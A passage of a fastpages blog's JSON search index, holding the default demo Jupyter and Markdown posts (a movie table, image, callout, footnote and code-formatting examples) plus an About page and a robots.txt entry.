| 146083.0 | 8000000.0 | Gramercy | R | 6.1 | NaN | . 1 First Love, Last Rites | 10876.0 | 300000.0 | Strand | R | 6.9 | NaN | . 2 I Married a Strange Person | 203134.0 | 250000.0 | Lionsgate | None | 6.8 | NaN | . 3 Let&#39;s Talk About Sex | 373615.0 | 300000.0 | Fine Line | None | NaN | 13.0 | . 4 Slam | 1087521.0 | 1000000.0 | Trimark | R | 3.4 | 62.0 | . Images . Local Images . You can reference local images and they will be copied and rendered on your blog automatically. You can include these with the following markdown syntax: . ![](my_icons/fastai_logo.png) . . Remote Images . Remote images can be included with the following markdown syntax: . ![](https://image.flaticon.com/icons/svg/36/36686.svg) . . Animated Gifs . Animated Gifs work, too! . ![](https://upload.wikimedia.org/wikipedia/commons/7/71/ChessPawnSpecialMoves.gif) . . Captions . You can include captions with markdown images like this: . ![](https://www.fast.ai/images/fastai_paper/show_batch.png &quot;Credit: https://www.fast.ai/2020/02/13/fastai-A-Layered-API-for-Deep-Learning/&quot;) . . Other Elements . GitHub Flavored Emojis . Typing I give this post two :+1:! will render this: . I give this post two :+1:! . Tweetcards . Typing &gt; twitter: https://twitter.com/jakevdp/status/1204765621767901185?s=20 will render this: Altair 4.0 is released! https://t.co/PCyrIOTcvvTry it with: pip install -U altairThe full list of changes is at https://t.co/roXmzcsT58 ...read on for some highlights. pic.twitter.com/vWJ0ZveKbZ . &mdash; Jake VanderPlas (@jakevdp) December 11, 2019 . Youtube Videos . Typing &gt; youtube: https://youtu.be/XfoYk_Z5AkI will render this: . Boxes / Callouts . Typing &gt; Warning: There will be no second warning! will render this: . Warning: There will be no second warning! . Typing &gt; Important: Pay attention! It&#39;s important. will render this: . Important: Pay attention! It&#8217;s important. . Typing &gt; Tip: This is my tip. will render this: . Tip: This is my tip. . Typing &gt; Note: Take note of this. will render this: . Note: Take note of this. . Typing &gt; Note: A doc link to [an example website: fast.ai](https://www.fast.ai/) should also work fine. will render in the docs: . Note: A doc link to an example website: fast.ai should also work fine. . Footnotes . You can have footnotes in notebooks, however the syntax is different compared to markdown documents. This guide provides more detail about this syntax, which looks like this: . For example, here is a footnote {% fn 1 %}. And another {% fn 2 %} {{ &#39;This is the footnote.&#39; | fndetail: 1 }} {{ &#39;This is the other footnote. You can even have a [link](www.github.com)!&#39; | fndetail: 2 }} . For example, here is a footnote 1. . And another 2 . 1. This is the footnote.↩ . 2. This is the other footnote. You can even have a link!↩ .",
            "url": "https://blog.justinor.dev/jupyter/2020/02/20/test.html",
            "relUrl": "/jupyter/2020/02/20/test.html",
            "date": " • Feb 20, 2020"
        }
        
    
  
    
        ,"post6": {
            "title": "An Example Markdown Post",
            "content": "Example Markdown Post . Basic setup . Jekyll requires blog post files to be named according to the following format: . YEAR-MONTH-DAY-filename.md . Where YEAR is a four-digit number, MONTH and DAY are both two-digit numbers, and filename is whatever file name you choose, to remind yourself what this post is about. .md is the file extension for markdown files. . The first line of the file should start with a single hash character, then a space, then your title. This is how you create a “level 1 heading” in markdown. Then you can create level 2, 3, etc headings as you wish but repeating the hash character, such as you see in the line ## File names above. . Basic formatting . You can use italics, bold, code font text, and create links. Here’s a footnote 1. Here’s a horizontal rule: . . Lists . Here’s a list: . item 1 | item 2 | . And a numbered list: . item 1 | item 2 | Boxes and stuff . This is a quotation . . You can include alert boxes …and… . . You can include info boxes Images . . Code . You can format text and code per usual . General preformatted text: . # Do a thing do_thing() . Python code and output: . # Prints &#39;2&#39; print(1+1) . 2 . Formatting text as shell commands: . echo &quot;hello world&quot; ./some_script.sh --option &quot;value&quot; wget https://example.com/cat_photo1.png . Formatting text as YAML: . key: value - another_key: &quot;another value&quot; . Tables . Column 1 Column 2 . A thing | Another thing | . Tweetcards . Altair 4.0 is released! https://t.co/PCyrIOTcvvTry it with: pip install -U altairThe full list of changes is at https://t.co/roXmzcsT58 ...read on for some highlights. pic.twitter.com/vWJ0ZveKbZ . &mdash; Jake VanderPlas (@jakevdp) December 11, 2019 Footnotes . This is the footnote. &#8617; . |",
            "url": "https://blog.justinor.dev/markdown/2020/01/14/test-markdown-post.html",
            "relUrl": "/markdown/2020/01/14/test-markdown-post.html",
            "date": " • Jan 14, 2020"
        }
        
    
  

  
  

  
      ,"page1": {
          "title": "About Me",
          "content": "This website is powered by fastpages 1. . a blogging platform that natively supports Jupyter notebooks in addition to other formats. &#8617; . |",
          "url": "https://blog.justinor.dev/about/",
          "relUrl": "/about/",
          "date": ""
      }
      
  

  

  
  

  

  
  

  

  
  

  
  

  
  

  
      ,"page10": {
          "title": "",
          "content": "Sitemap: {{ “sitemap.xml” | absolute_url }} | .",
          "url": "https://blog.justinor.dev/robots.txt",
          "relUrl": "/robots.txt",
          "date": ""
      }
      
  

}